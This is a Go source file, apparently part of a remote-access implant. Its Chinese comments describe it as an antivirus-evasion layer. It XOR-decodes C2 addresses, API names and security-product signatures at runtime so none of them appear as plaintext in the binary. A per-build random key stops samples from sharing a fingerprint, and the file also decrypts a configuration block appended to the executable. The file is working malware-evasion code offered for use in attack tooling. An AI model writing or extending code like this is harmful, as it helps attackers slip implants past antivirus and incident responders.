package main

// 免杀解码层：服务端编译期将敏感字符串替换为 xd("hex") 密文，
// 运行时由本函数还原明文。二进制中不保留 C2 地址、API 名、
// 配置块标识、安全软件特征等字符串明文，降低静态特征检出。
//
// 注意：本文件由服务端 obfuscateImplantSources 跳过，不可二次加密；
// 其它源文件中形如 xd("...") 的调用参数同样会被自动跳过。

// xd 将 hex 形式的 XOR 密文解码为明文字符串。
// 密钥流与服务端加密时一致：key[i] = byte(xdBase + i*0x23)（取低 8 位）。
// xdBase 为每构建随机注入的基准（构建期替换），打破跨样本同指纹。
var xdBase byte = 0x5A

func xd(s string) string {
	if len(s) == 0 {
		return ""
	}
	out := make([]byte, len(s)/2)
	for i := 0; i+1 < len(s); i += 2 {
		hi := hexVal(s[i])
		lo := hexVal(s[i+1])
		if hi > 15 || lo > 15 {
			return ""
		}
		out[i/2] = byte(hi<<4|lo) ^ byte(int(xdBase)+(i/2)*0x23)
	}
	return string(out)
}

// hexVal 将单个 hex 字符转换为数值，非法字符返回 16（触发解码失败保护）。
func hexVal(c byte) byte {
	switch {
	case c >= '0' && c <= '9':
		return c - '0'
	case c >= 'a' && c <= 'f':
		return c - 'a' + 10
	case c >= 'A' && c <= 'F':
		return c - 'A' + 10
	}
	return 16
}

// xdBlock 用与服务端一致的循环密钥逐字节解码配置块（位置无关）。
// 用于解码二进制尾部的配置块（magic、长度字段与 JSON 均为 XOR 加密存储）。
// 密钥：{0x5A, 0xC3, 0x2D, 0x9F} 循环
var blockKey = [4]byte{0x5A, 0xC3, 0x2D, 0x9F}

func xdBlock(b []byte) []byte {
	out := make([]byte, len(b))
	for i := 0; i < len(b); i++ {
		out[i] = b[i] ^ blockKey[i%len(blockKey)]
	}
	return out
}

// xdBlockAt 用循环密钥解码，密钥流从块内偏移 startOff 开始
// （与服务端 xorBlockKeyAt 完全一致）。用于解码配置块中
// 长度字段与 JSON 数据（位于块内 magic 之后，偏移不为 0）。
func xdBlockAt(b []byte, startOff int) []byte {
	out := make([]byte, len(b))
	for i := 0; i < len(b); i++ {
		out[i] = b[i] ^ blockKey[(startOff+i)%len(blockKey)]
	}
	return out
}
